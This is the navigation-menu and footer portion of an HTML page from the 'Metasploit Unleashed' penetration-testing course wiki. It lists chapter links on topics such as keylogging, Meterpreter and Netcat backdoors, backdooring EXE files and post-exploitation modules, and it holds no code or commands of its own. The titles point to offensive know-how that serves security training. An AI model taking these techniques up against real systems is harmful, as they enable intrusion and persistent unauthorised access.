							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
							<li><a href="Pivoting">Pivoting</a></li>
                                                                <ul class="two small">
                                                                        <li><a href="Portfwd">Portfwd</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							<li><a href="TimeStomp">TimeStomp</a></li>
							<li><a href="Screen_Capture">Screen Capture</a></li>
							<li><a href="Searching_For_Content">Searching For Content</a></li>
							<li><a href="John_The_Ripper">John The Ripper</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
					<div class="menu two-column">
						<h3>Meterpreter Scripting</h3>
						<ul class="one">
							<li><a href="Existing_Scripts">Existing Scripts</a></li>
							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
							<li><a href="Custom_Scripting">Custom Scripting</a></li>
							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
							<li><a href="Useful_Functions">Useful Functions</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
					<div class="menu two-column">
						<h3>Maintaining Access</h3>
						<ul class="one">
							<li><a href="Keylogging">Keylogging</a></li>
							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
						        <ul class="two small">
								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
							</ul>
								 <div class="clear"></div>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
					<div class="menu two-column">
						<h3>MSF Extended Usage</h3>
						<ul class="one">
							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
							<li><a href="Karmetasploit">Karmetasploit</a>
								<ul class="two small">
									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
									<li><a href="Attack_Analysis">Attack Analysis</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
							<li><a href="Building_A_Module">Building A Module</a>
								<ul class="two small">
									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
					<div class="menu two-column">
						<h3>Metasploit GUIs</h3>
						<ul class="one">
							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
								<ul class="two small">
                                                                        <li><a href="Scanning">Scanning</a></li>
                                                                        <li><a href="Exploitation">Exploitation</a></li>
                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
                                                                </ul>
								<div class="clear"></div>
                                                        </li>
							<li><a href="Armitage">Armitage</a>
                                                                <ul class="two small">
                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
								</ul>
							</li>
						</ul>
					</div>
				</li>
				<li><a href="About_The_Authors" class="root">About The Authors</a>
					<div class="menu two-column">
						<h3>About the Authors</h3>
						<ul class="one">
							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
							<li><a href="William_Coppola">William Coppola</a></li>
							<li><a href="Paul_Hand">Paul Hand</a></li>
							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
							<li><a href="Devon_Kearns">Devon Kearns</a></li>
							<li><a href="David_Kennedy">David Kennedy</a></li>
							<li><a href="Steven_McElrea">Steven McElrea</a></li>
							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
							<li><a href="David_Ovitz">David Ovitz</a></li>
							<li><a href="Carlos_Perez">Carlos Perez</a></li>
						</ul>
					</div>
				</li>
                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
                                        <div class="menu three-column">
                                                <h3>Post Module Reference</h3>
                                                <ul class="one">
                                                        <li>Windows   
                                                                <ul class="two">
                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Linux
                                                                <ul class="two">
                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>OS X
                                                                <ul class="two">
                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                        <li>Multiple OS
                                                                <ul class="two">
                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
                                                                </ul>
							                                	<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
                                        <div class="menu four-column">
                                                <h3>Auxiliary Module Reference</h3>
                                                <ul class="one">
                                                        <li>Admin   
                                                                <ul class="two">
                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
                                                        <li>Scanner
                                                                <ul class="two">
                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>Server
                                                                <ul class="two">
                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
			<br />
			<br />
			<br />
			<br />
			</ul>
													</div>
				
					<div class="clear"></div>
				</div>

				<div id="footer">
					<div id="footer-content">
						<div class="left">
							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
						</div>
						<div class="right">
							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
						</div>
						<div class="clear"></div>
					</div>
				</div>
			
		</div>
<script>if(window.mw){
mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
}</script>
<script>if(window.mw){
mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
}</script>
<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-1981501-1");
pageTracker._trackPageview();
</script><!-- Served in 0.169 secs. --></body></html>